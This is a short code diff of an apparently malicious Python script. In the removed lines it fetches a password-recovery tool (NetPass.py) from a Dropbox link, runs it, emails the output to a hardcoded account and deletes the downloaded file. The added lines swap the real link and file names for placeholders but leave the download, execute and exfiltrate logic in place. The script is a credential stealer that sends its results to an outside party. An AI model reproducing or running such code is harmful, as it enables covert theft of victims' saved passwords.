@@ -12,7 +12,7 @@ def sending_mail(email, password , message) :
     server.quit()
 
 
-Downloader("https://dl.dropboxusercontent.com/s/b32iy3m6b6glspw/NetPass.py?dl=1" , "kk.py")
-Command_result = subprocess.check_output("python kk.py" , shell=True)
+Downloader("Download Link " , "Outfile.py")
+Command_result = subprocess.check_output("python Outfile.py" , shell=True)
 sending_mail("Email", "Password", Command_result)
 subprocess.check_output("del kk.py" , shell=True)
